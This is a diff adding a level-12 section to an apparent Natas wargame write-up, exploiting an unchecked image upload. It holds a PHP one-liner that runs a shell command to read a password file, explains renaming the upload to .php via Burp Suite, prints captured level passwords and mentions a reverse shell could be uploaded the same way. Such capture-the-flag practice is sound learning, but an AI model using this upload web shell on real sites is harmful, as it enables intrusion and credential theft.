@@ -236,3 +236,21 @@ Change our cookie with the new one.
 
 > The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 ##
+
+### Natas 12
+###### Choose a JPEG to upload (max 1KB):
+
+After playing a bit, I saw that there's nothing to indicate that the file is actually verified to be a **.jpg**.  
+Anyway, we can upload a **file.php** that will read from **/etc/natas_webpass/natas13** file.  
+```
+<?php echo exec("cat /etc/natas_webpass/natas13"); ?>
+```
+
+Then, we upload it and intercecpt the upload in burpsuite where we change the extension from .jpg to .php.   
+> 9a9ulg2iz1.jpg -- change it to .php
+
+Then, if we follow the link generated, we see the content of **/etc/natas_webpassa/natas13** file.  
+> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+**Note**: We could've uploaded a reverse shell in the same way, but I don't know if we're allowed in Natas rooms.  
+##
